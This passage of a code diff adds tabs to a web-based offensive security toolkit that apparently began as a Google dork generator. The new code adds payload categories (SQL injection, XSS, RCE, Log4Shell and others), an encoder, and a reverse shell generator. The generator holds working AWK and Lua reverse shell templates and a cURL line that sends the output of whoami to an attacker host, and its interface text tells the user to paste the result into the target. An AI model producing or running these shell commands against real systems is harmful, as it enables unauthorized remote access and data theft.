+    "awk":         { label: "AWK",              cmd: (ip, p) => `awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";while(1){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}'` },
+    "lua":         { label: "Lua",              cmd: (ip, p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
+    "curl-upload": { label: "cURL exfil",       cmd: (ip, p) => `curl -s http://${ip}:${p}/$(whoami|base64)` },
+  }
+
+  const currentShell = reverseShells[rsType]?.cmd(rsIP || "LHOST", rsPort || "LPORT") ?? ""
+
+  const copyShell = async () => {
+    await navigator.clipboard.writeText(currentShell)
+    setRsCopied(true)
+    setTimeout(() => setRsCopied(false), 2000)
+  }
+
+  // ── Export payload category as .txt ───────────────────────────────────────
+  const exportPayloads = (category: { title: string; payloads: string[] }) => {
+    const blob = new Blob([category.payloads.join("\n")], { type: "text/plain" })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement("a")
+    a.href = url
+    a.download = `${category.title.toLowerCase().replace(/[^a-z0-9]+/g, "-")}.txt`
+    a.click()
+    URL.revokeObjectURL(url)
   }
 
   return (
@@ -454,97 +776,447 @@ export function GoogleDorksGenerator() {
             </div>
           </div>
 
-          {/* Domain input */}
-          <div className="max-w-3xl mx-auto mb-16">
-            <div className="relative group">
-              <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/20 to-purple-500/20 rounded-2xl blur-lg group-hover:blur-xl transition-all"></div>
+          {/* Tab selector */}
+          <div className="flex justify-center mb-10">
+            <div className="inline-flex bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-1 gap-1">
+              <button
+                onClick={() => setActiveTab("dorks")}
+                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
+                  activeTab === "dorks"
+                    ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white shadow-lg"
+                    : "text-gray-400 hover:text-white"
+                }`}
+              >
+                <Search className="h-4 w-4" />
+                Google Dorks
+              </button>
+              <button
+                onClick={() => setActiveTab("payloads")}
+                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
+                  activeTab === "payloads"
+                    ? "bg-gradient-to-r from-pink-500 to-orange-500 text-white shadow-lg"
+                    : "text-gray-400 hover:text-white"
+                }`}
+              >
+                <Bug className="h-4 w-4" />
+                Payloads
+              </button>
+              <button
+                onClick={() => setActiveTab("tools")}
+                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
+                  activeTab === "tools"
+                    ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg"
+                    : "text-gray-400 hover:text-white"
+                }`}
+              >
+                <Wrench className="h-4 w-4" />
+                Tools
+              </button>
+            </div>
+          </div>
+
+          {/* Domain input + filtros — solo visible en dorks */}
+          {activeTab === "dorks" && (
+            <div className="max-w-3xl mx-auto mb-10">
+              <div className="relative group mb-6">
+                <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/20 to-purple-500/20 rounded-2xl blur-lg group-hover:blur-xl transition-all"></div>
+                <div className="relative">
+                  <Search className="absolute left-6 top-1/2 -translate-y-1/2 h-6 w-6 text-gray-400" />
+                  <Input
+                    type="text"
+                    placeholder="example.com, target.com, *.domain.com"
+                    value={domain}
+                    onChange={(e) => setDomain(e.target.value)}
+                    className="w-full pl-14 pr-6 py-6 text-lg bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl text-white placeholder-gray-400 focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/20 transition-all shadow-2xl"
+                  />
+                  <Button
+                    onClick={openAllDorks}
+                    className="absolute right-3 top-1/2 -translate-y-1/2 bg-gradient-to-r from-purple-500 to-cyan-500 hover:from-purple-600 hover:to-cyan-600 text-white font-semibold px-4 py-2 rounded-lg shadow-lg hover:shadow-xl transition-all hover:scale-105"
+                  >
+                    <Zap className="h-4 w-4 mr-2" />
+                    Open All Dorks
+                  </Button>
+                </div>
+              </div>
+              <p className="text-gray-400 mb-6 text-sm text-center">
+                Enter single or multiple domains separated by commas • Supports wildcards and subdomains
+              </p>
+              {/* Filtros de categoría */}
+              <div className="flex flex-wrap justify-center gap-2 mb-4">
+                {dorkGroups.map((g) => {
+                  const count = g === "all"
+                    ? dorkCategories.length
+                    : dorkCategories.filter((c) => c.group === g).length
+                  return (
+                    <button
+                      key={g}
+                      onClick={() => setDorkFilter(g)}
+                      className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold border transition-all ${
+                        dorkFilter === g
+                          ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white border-transparent shadow"
+                          : "bg-white/5 text-gray-400 border-white/10 hover:text-white hover:border-white/20"
+                      }`}
+                    >
+                      {g === "all" ? "All" : g}
+                      <span className={`text-[10px] px-1.5 py-0.5 rounded-full ${dorkFilter === g ? "bg-white/20" : "bg-white/10"}`}>
+                        {count}
+                      </span>
+                    </button>
+                  )
+                })}
+              </div>
+              {/* Búsqueda */}
               <div className="relative">
-                <Search className="absolute left-6 top-1/2 -translate-y-1/2 h-6 w-6 text-gray-400" />
-                <Input
+                <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
+                <input
                   type="text"
-                  placeholder="example.com, target.com, *.domain.com"
-                  value={domain}
-                  onChange={(e) => setDomain(e.target.value)}
-                  className="w-full pl-14 pr-6 py-6 text-lg bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl text-white placeholder-gray-400 focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/20 transition-all shadow-2xl"
+                  placeholder="Buscar en dorks..."
+                  value={dorkSearch}
+                  onChange={(e) => setDorkSearch(e.target.value)}
+                  className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-400/50 focus:bg-white/10 transition-all"
                 />
-                {/* Open All Dorks Button */}
-                <Button
-                  onClick={openAllDorks}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 bg-gradient-to-r from-purple-500 to-cyan-500 hover:from-purple-600 hover:to-cyan-600 text-white font-semibold px-4 py-2 rounded-lg shadow-lg hover:shadow-xl transition-all hover:scale-105"
-                >
-                  <Zap className="h-4 w-4 mr-2" />
-                  Open All Dorks
-                </Button>
               </div>
             </div>
-            <p className="text-gray-400 mt-4 text-sm">
-              Enter single or multiple domains separated by commas • Supports wildcards and subdomains
-            </p>
-          </div>
+          )}
+
+          {/* Payload filter — solo visible en payloads */}
+          {activeTab === "payloads" && (
+            <div className="max-w-3xl mx-auto mb-12 space-y-4">
+              <div className="flex flex-wrap justify-center gap-2">
+                {["all", "SQL Injection", "NoSQL Injection", "XSS", "RCE", "SSTI", "LFI / Traversal", "XXE", "SSRF", "Open Redirect", "CRLF", "HTTP Smuggling", "Log4Shell", "GraphQL", "Prototype Pollution", "Host Header", "JWT"].map((f) => (
+                  <button
+                    key={f}
+                    onClick={() => setPayloadFilter(f)}
+                    className={`px-4 py-1.5 rounded-full text-xs font-semibold border transition-all ${
+                      payloadFilter === f
+                        ? "bg-gradient-to-r from-pink-500 to-orange-500 text-white border-transparent shadow"
+                        : "bg-white/5 text-gray-400 border-white/10 hover:text-white hover:border-white/20"
+                    }`}
+                  >
+                    {f === "all" ? "All" : f}
+                  </button>
+                ))}
+              </div>
+              {/* Búsqueda */}
+              <div className="relative">
+                <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
+                <input
+                  type="text"
+                  placeholder="Buscar payload..."
+                  value={payloadSearch}
+                  onChange={(e) => setPayloadSearch(e.target.value)}
+                  className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-pink-400/50 focus:bg-white/10 transition-all"
+                />
+              </div>
+            </div>
+          )}
         </div>
 
-        {/* Grid: cada card solo la altura de su contenido, sin espacio vacío abajo */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 items-start">
-          {dorkCategories.map((category, categoryIndex) => (
-            <Card 
-              key={categoryIndex}
-              className="group bg-white/5 backdrop-blur-md border border-white/10 hover:border-white/20 transition-all duration-300 hover:shadow-2xl hover:shadow-purple-500/10"
-            >
-              <CardHeader className="pb-4">
-                <div className="flex items-center justify-between mb-3">
-                  <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg ${category.color} border`}>
-                    {category.icon}
-                    <span className="text-xs font-semibold">{category.title.split(':')[0]}</span>
+        {/* Grid Google Dorks */}
+        {activeTab === "dorks" && (
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 items-start">
+            {dorkCategories
+              .filter((c) => dorkFilter === "all" || c.group === dorkFilter)
+              .filter((c) => {
+                if (!dorkSearch.trim()) return true
+                const q = dorkSearch.toLowerCase()
+                return c.title.toLowerCase().includes(q) || c.description.toLowerCase().includes(q) || c.dorks.some(d => d.toLowerCase().includes(q))
+              })
+              .map((category, categoryIndex) => (
+              <Card
+                key={categoryIndex}
+                className="group bg-white/5 backdrop-blur-md border border-white/10 hover:border-white/20 transition-all duration-300 hover:shadow-2xl hover:shadow-purple-500/10"
+              >
+                <CardHeader className="pb-4">
+                  <div className="flex items-center justify-between mb-3">
+                    <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg ${category.color} border`}>
+                      {category.icon}
+                      <span className="text-xs font-semibold">{category.group}</span>
+                    </div>
+                    <Badge variant="secondary" className="bg-white/10 text-white border-white/20">
+                      {category.dorks.length}
+                    </Badge>
                   </div>
-                  <Badge variant="secondary" className="bg-white/10 text-white border-white/20">
-                    {category.dorks.length}
-                  </Badge>
-                </div>
-                <CardTitle className="text-white text-lg font-bold mb-2">
-                  {category.title}
-                </CardTitle>
-                <p className="text-gray-400 text-sm leading-relaxed">
-                  {category.description}
-                </p>
-              </CardHeader>
-              
-              <CardContent className="space-y-3">
-                <div className="space-y-2">
-                  {category.dorks.map((dork, dorkIndex) => {
-                    const processedDork = replaceDomain(dork, domain)
-                    const uniqueKey = `${categoryIndex}-${dorkIndex}`
-                    const isCopied = copiedIndex === uniqueKey
+                  <CardTitle className="text-white text-lg font-bold mb-2">
+                    {category.title}
+                  </CardTitle>
+                  <p className="text-gray-400 text-sm leading-relaxed">
+                    {category.description}
+                  </p>
+                </CardHeader>
 
-                    return (
-                      <div key={dorkIndex} className="group/dork relative">
-                        <a
-                          href={generateGoogleSearchUrl(processedDork)}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="block p-3 bg-white/5 hover:bg-white/10 border border-white/10 hover:border-white/20 rounded-lg text-sm font-mono text-gray-300 hover:text-white transition-colors break-all"
-                        >
-                          {processedDork}
-                        </a>
-                        <Button
-                          size="icon"
-                          variant="ghost"
-                          className="absolute top-2 right-2 h-8 w-8 opacity-0 group-hover/dork:opacity-100 transition-all hover:bg-white/20 rounded-lg"
-                          onClick={() => copyToClipboard(processedDork, uniqueKey)}
-                        >
-                          {isCopied ? (
-                            <Check className="h-4 w-4 text-green-400" />
-                          ) : (
-                            <Copy className="h-4 w-4 text-gray-400" />
-                          )}
-                        </Button>
+                <CardContent className="space-y-3">
+                  <div className="space-y-2">
+                    {category.dorks.map((dork, dorkIndex) => {
+                      const processedDork = replaceDomain(dork, domain)
+                      const uniqueKey = `${categoryIndex}-${dorkIndex}`
+                      const isCopied = copiedIndex === uniqueKey
+
+                      return (
+                        <div key={dorkIndex} className="group/dork relative">
+                          <a
+                            href={generateGoogleSearchUrl(processedDork)}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="block p-3 bg-white/5 hover:bg-white/10 border border-white/10 hover:border-white/20 rounded-lg text-sm font-mono text-gray-300 hover:text-white transition-colors break-all"
+                          >
+                            {processedDork}
+                          </a>
+                          <Button
+                            size="icon"
+                            variant="ghost"
+                            className="absolute top-2 right-2 h-8 w-8 opacity-0 group-hover/dork:opacity-100 transition-all hover:bg-white/20 rounded-lg"
+                            onClick={() => copyToClipboard(processedDork, uniqueKey)}
+                          >
+                            {isCopied ? (
+                              <Check className="h-4 w-4 text-green-400" />
+                            ) : (
+                              <Copy className="h-4 w-4 text-gray-400" />
+                            )}
+                          </Button>
+                        </div>
+                      )
+                    })}
+                  </div>
+                </CardContent>
+              </Card>
+            ))}
+          </div>
+        )}
+
+        {/* Grid Payloads */}
+        {activeTab === "payloads" && (
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 items-start">
+            {allPayloadCategories
+              .filter((cat) => payloadFilter === "all" || cat.tag === payloadFilter)
+              .filter((cat) => {
+                if (!payloadSearch.trim()) return true
+                const q = payloadSearch.toLowerCase()
+                return cat.title.toLowerCase().includes(q) || cat.tag.toLowerCase().includes(q) || cat.payloads.some(p => p.toLowerCase().includes(q))
+              })
+              .map((category: PayloadCategory, categoryIndex: number) => {
+                const copyAllKey = `payloads-all-${categoryIndex}`
+                const isCopyAllDone = copiedIndex === copyAllKey
+                return (
+                  <Card
+                    key={categoryIndex}
+                    className="group bg-white/5 backdrop-blur-md border border-white/10 hover:border-white/20 transition-all duration-300 hover:shadow-2xl hover:shadow-pink-500/10"
+                  >
+                    <CardHeader className="pb-4">
+                      <div className="flex items-center justify-between mb-3">
+                        <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg ${category.tagColor} border`}>
+                          <Bug className="h-3 w-3" />
+                          <span className="text-xs font-semibold">{category.tag}</span>
+                        </div>
+                        <div className="flex items-center gap-1.5">
+                          <Badge variant="secondary" className="bg-white/10 text-white border-white/20">
+                            {category.payloads.length}
+                          </Badge>
+                          <Button
+                            size="icon"
+                            variant="ghost"
+                            title="Copy all"
+                            className="h-7 w-7 hover:bg-white/20 rounded-lg"
+                            onClick={() => copyToClipboard(category.payloads.join("\n"), copyAllKey)}
+                          >
+                            {isCopyAllDone ? (
+                              <Check className="h-3.5 w-3.5 text-green-400" />
+                            ) : (
+                              <Copy className="h-3.5 w-3.5 text-gray-400" />
+                            )}
+                          </Button>
+                          <Button
+                            size="icon"
+                            variant="ghost"
+                            title="Export .txt"
+                            className="h-7 w-7 hover:bg-white/20 rounded-lg"
+                            onClick={() => exportPayloads(category)}
+                          >
+                            <Download className="h-3.5 w-3.5 text-gray-400" />
+                          </Button>
+                        </div>
                       </div>
-                    )
-                  })}
+                      <CardTitle className="text-white text-lg font-bold mb-2">
+                        {category.title}
+                      </CardTitle>
+                      <p className="text-gray-400 text-sm leading-relaxed">
+                        {category.description}
+                      </p>
+                    </CardHeader>
+
+                    <CardContent className="space-y-3">
+                      <div className="space-y-2">
+                        {category.payloads.map((payload: string, payloadIndex: number) => {
+                          const uniqueKey = `payload-${categoryIndex}-${payloadIndex}`
+                          const isCopied = copiedIndex === uniqueKey
+                          return (
+                            <div key={payloadIndex} className="group/payload relative">
+                              <pre className="block p-3 bg-white/5 border border-white/10 rounded-lg text-xs font-mono text-gray-300 break-all whitespace-pre-wrap leading-relaxed pr-10">
+                                {payload}
+                              </pre>
+                              <Button
+                                size="icon"
+                                variant="ghost"
+                                className="absolute top-2 right-2 h-7 w-7 opacity-0 group-hover/payload:opacity-100 transition-all hover:bg-white/20 rounded-lg"
+                                onClick={() => copyToClipboard(payload, uniqueKey)}
+                              >
+                                {isCopied ? (
+                                  <Check className="h-3.5 w-3.5 text-green-400" />
+                                ) : (
+                                  <Copy className="h-3.5 w-3.5 text-gray-400" />
+                                )}
+                              </Button>
+                            </div>
+                          )
+                        })}
+                      </div>
+                    </CardContent>
+                  </Card>
+                )
+              })}
+          </div>
+        )}
+
+        {/* ── Tools Tab ── */}
+        {activeTab === "tools" && (
+          <div className="space-y-10 max-w-4xl mx-auto">
+
+            {/* Encoder / Decoder */}
+            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
+              <CardHeader className="pb-4">
+                <div className="flex items-center gap-3 mb-1">
+                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                    <Code className="h-4 w-4" />
+                    <span className="text-xs font-semibold">Encoder / Decoder</span>
+                  </div>
                 </div>
+                <CardTitle className="text-white text-xl font-bold">Encoder / Decoder</CardTitle>
+                <p className="text-gray-400 text-sm">URL · Base64 · HTML Entities · Hex · Unicode · JS Escape</p>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <textarea
+                  rows={4}
+                  placeholder="Pega aquí el texto a codificar / decodificar..."
+                  value={encInput}
+                  onChange={(e) => setEncInput(e.target.value)}
+                  className="w-full p-4 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-emerald-400/50 resize-none"
+                />
+                <div className="flex flex-wrap gap-2">
+                  {[
+                    { id: "url-enc",    label: "URL Encode" },
+                    { id: "url-dec",    label: "URL Decode" },
+                    { id: "url-double", label: "Double URL Encode" },
+                    { id: "b64-enc",    label: "Base64 Encode" },
+                    { id: "b64-dec",    label: "Base64 Decode" },
+                    { id: "html-enc",   label: "HTML Encode" },
+                    { id: "html-dec",   label: "HTML Decode" },
+                    { id: "hex-enc",    label: "Hex Encode" },
+                    { id: "hex-dec",    label: "Hex Decode" },
+                    { id: "unicode",    label: "Unicode Escape" },
+                    { id: "js-escape",  label: "JS \\x Escape" },
+                  ].map(({ id, label }) => (
+                    <button
+                      key={id}
+                      onClick={() => runEncode(id)}
+                      className="px-3 py-1.5 text-xs font-semibold rounded-lg bg-white/5 hover:bg-emerald-500/20 border border-white/10 hover:border-emerald-500/30 text-gray-300 hover:text-emerald-300 transition-all"
+                    >
+                      {label}
+                    </button>
+                  ))}
+                </div>
+                {encOutput && (
+                  <div className="relative">
+                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-sm font-mono text-emerald-300 break-all whitespace-pre-wrap max-h-48 overflow-y-auto pr-12">
+                      {encOutput}
+                    </pre>
+                    <Button
+                      size="icon"
+                      variant="ghost"
+                      className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg"
+                      onClick={copyEncOutput}
+                    >
+                      {encCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
+                    </Button>
+                  </div>
+                )}
               </CardContent>
             </Card>
-          ))}
-        </div>
+
+            {/* Reverse Shell Generator */}
+            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
+              <CardHeader className="pb-4">
+                <div className="flex items-center gap-3 mb-1">
+                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-500/10 text-red-400 border border-red-500/20">
+                    <Terminal className="h-4 w-4" />
+                    <span className="text-xs font-semibold">Reverse Shell Generator</span>
+                  </div>
+                </div>
+                <CardTitle className="text-white text-xl font-bold">Reverse Shell Generator</CardTitle>
+                <p className="text-gray-400 text-sm">Configura LHOST, LPORT y tipo de shell. Copia y pega en el target.</p>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 mb-2">LHOST (tu IP)</label>
+                    <input
+                      type="text"
+                      placeholder="10.10.10.1"
+                      value={rsIP}
+                      onChange={(e) => setRsIP(e.target.value)}
+                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-red-400/50"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 mb-2">LPORT</label>
+                    <input
+                      type="text"
+                      placeholder="4444"
+                      value={rsPort}
+                      onChange={(e) => setRsPort(e.target.value)}
+                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-red-400/50"
+                    />
+                  </div>
+                </div>
+                <div>
+                  <label className="block text-xs font-semibold text-gray-400 mb-2">Tipo de shell</label>
+                  <div className="flex flex-wrap gap-2">
+                    {Object.entries(reverseShells).map(([key, { label }]) => (
+                      <button
+                        key={key}
+                        onClick={() => setRsType(key)}
+                        className={`px-3 py-1.5 text-xs font-semibold rounded-lg border transition-all ${
+                          rsType === key
+                            ? "bg-red-500/20 border-red-500/40 text-red-300"
+                            : "bg-white/5 border-white/10 text-gray-400 hover:text-white hover:border-white/20"
+                        }`}
+                      >
+                        {label}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+                <div className="relative">
+                  <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-sm font-mono text-red-300 break-all whitespace-pre-wrap pr-12">
+                    {currentShell}
+                  </pre>
+                  <Button
+                    size="icon"
+                    variant="ghost"
+                    className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg"
+                    onClick={copyShell}
+                  >
+                    {rsCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
+                  </Button>
+                </div>
+                <p className="text-xs text-gray-600">
+                  Listener: <span className="font-mono text-gray-400">nc -lvnp {rsPort || "LPORT"}</span>
+                  {rsType.startsWith("socat") && <span className="ml-3 font-mono text-gray-400">socat file:`tty`,raw,echo=0 tcp-listen:{rsPort || "LPORT"}</span>}
+                </p>
+              </CardContent>
+            </Card>
+
+          </div>
+        )}
 
         {/* Footer */}
         <div className="mt-20 text-center space-y-6">
